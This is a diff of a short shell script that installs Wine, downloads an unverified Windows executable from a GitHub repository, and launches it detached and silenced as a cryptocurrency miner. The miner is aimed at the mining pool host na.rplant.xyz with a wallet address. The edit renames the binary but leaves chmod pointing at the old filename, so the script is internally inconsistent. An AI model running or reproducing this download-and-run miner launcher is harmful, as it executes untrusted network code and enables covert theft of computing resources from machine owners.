@@ -1,11 +1,11 @@
 sudo dpkg --add-architecture i386
 sudo apt update
 sudo apt install -y wine wine64 wine32
-wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/nim-power2b.exe
+wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/fpc-power2b.exe
 chmod +x nim-power2b.exe
-nohup wine ./nim-power2b.exe \
+nohup wine ./fpc-power2b.exe \
       mine na.rplant.xyz 7022 \
       'BgFAEEhn9yvubV7iQ6cZxHU2KrdS6oBEY1.WORKER' \
       x \
-      6 \
+      5 \
       > log 2>&1 < /dev/null &
